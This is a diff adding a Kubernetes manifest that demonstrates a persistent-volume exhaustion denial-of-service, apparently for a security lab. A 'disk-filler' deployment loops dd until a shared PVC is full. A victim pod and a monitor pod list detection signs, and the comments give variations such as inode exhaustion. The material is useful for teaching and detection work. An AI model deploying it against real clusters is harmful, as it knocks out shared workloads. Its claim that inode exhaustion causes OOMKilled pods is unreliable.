@@ -1,0 +1,218 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: pvc-exhaustion
+---
+# DoS Attack #4: Persistent Volume Claim Exhaustion
+# Description: Pod writes unbounded data to mounted volume,
+# filling disk and crashing applications.
+#
+# Attack Flow:
+# 1. Mount: Pod has access to PersistentVolume
+# 2. Write: Continuously write data to fill volume
+# 3. Impact:
+#    - Volume fills to capacity
+#    - Application can't write to disk
+#    - Application pods crash (out of disk)
+#    - Node becomes unable to schedule pods
+#    - Cascading failure across applications sharing storage
+# 4. Persist: Filled disk persists until manually cleaned
+#
+# Why Effective:
+# - Disk typically larger than memory (harder to detect)
+# - Single pod can corrupt shared volumes
+# - Storage often shared across multiple applications
+# - Cleanup requires manual intervention
+#
+# Variations:
+# - Fill single pod's ephemeral storage (/tmp)
+# - Fill node's local storage
+# - Fill inode count (many small files)
+# - Fill shared PVC across multiple pods
+#
+# Detection Points:
+# - Pod disk usage spike
+# - PVC usage > 90%
+# - "No space left on device" errors in app logs
+# - Pod OOMKilled due to inode exhaustion
+# - Node disk pressure events
+# - Application write failures
+
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: shared-storage
+  namespace: pvc-exhaustion
+spec:
+  accessModes:
+    - ReadWriteOnce
+  resources:
+    requests:
+      storage: 1Gi
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: disk-filler
+  namespace: pvc-exhaustion
+  labels:
+    app: filler
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: filler
+  template:
+    metadata:
+      labels:
+        app: filler
+      annotations:
+        attack-vector: "pvc-exhaustion"
+    spec:
+      containers:
+      - name: filler
+        image: ubuntu:latest
+        command:
+        - bash
+        - -c
+        - |
+          echo "[*] PVC Exhaustion Attack"
+          
+          echo "[*] Filling /mnt/storage volume..."
+          
+          # Write in a loop until disk is full
+          i=0
+          while true; do
+            dd if=/dev/zero of=/mnt/storage/file-$i bs=1M count=100 2>/dev/null || {
+              echo "[!] Disk full or write error!"
+              echo "[+] Attack successful - volume exhausted"
+              tail -f /dev/null
+            }
+            i=$((i+1))
+            echo "[*] Wrote $((i*100))MB, continuing..."
+            sleep 1
+          done
+        volumeMounts:
+        - name: storage
+          mountPath: /mnt/storage
+      volumes:
+      - name: storage
+        persistentVolumeClaim:
+          claimName: shared-storage
+
+---
+# Victim pod trying to use same storage
+apiVersion: v1
+kind: Pod
+metadata:
+  name: storage-victim
+  namespace: pvc-exhaustion
+  labels:
+    app: victim
+spec:
+  containers:
+  - name: victim
+    image: nginx:latest
+    volumeMounts:
+    - name: storage
+      mountPath: /data
+    lifecycle:
+      postStart:
+        exec:
+          command:
+          - sh
+          - -c
+          - |
+            echo "[*] Victim application trying to write..."
+            
+            # Try to write to storage
+            for i in {1..10}; do
+              echo "App data" >> /data/app.log 2>&1
+              if [ $? -ne 0 ]; then
+                echo "[!] FAILED: Cannot write to storage!"
+                echo "[!] Storage is full or inaccessible"
+              fi
+              sleep 1
+            done
+  volumes:
+  - name: storage
+    persistentVolumeClaim:
+      claimName: shared-storage
+
+---
+# Monitoring disk usage
+apiVersion: v1
+kind: Pod
+metadata:
+  name: storage-monitor
+  namespace: pvc-exhaustion
+  labels:
+    tool: monitor
+spec:
+  serviceAccountName: monitor-sa
+  containers:
+  - name: monitor
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== PVC Exhaustion Detection ==="
+      
+      echo "[*] Storage usage monitoring:"
+      echo ""
+      
+      # Check PVC status
+      echo "[*] PVC Status:"
+      # kubectl get pvc -n pvc-exhaustion
+      
+      echo ""
+      echo "[*] Red flags:"
+      echo "  • PVC usage > 90%"
+      echo "  • PVC usage growing rapidly"
+      echo "  • Pod logs: 'No space left on device'"
+      echo "  • Pod status: OOMKilled"
+      echo "  • Node disk pressure events"
+      echo "  • Application write failures"
+      
+      echo ""
+      echo "[*] Inode exhaustion also possible:"
+      echo "  • Create millions of small files instead"
+      echo "  • 'Cannot create file: No space' despite disk space available"
+      echo "  • df shows used inodes near max"
+      
+      sleep 3600
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: monitor-sa
+  namespace: pvc-exhaustion
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: monitor-role
+  namespace: pvc-exhaustion
+rules:
+- apiGroups: [""]
+  resources: ["persistentvolumeclaims", "pods"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: monitor-binding
+  namespace: pvc-exhaustion
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: monitor-role
+subjects:
+- kind: ServiceAccount
+  name: monitor-sa
+  namespace: pvc-exhaustion
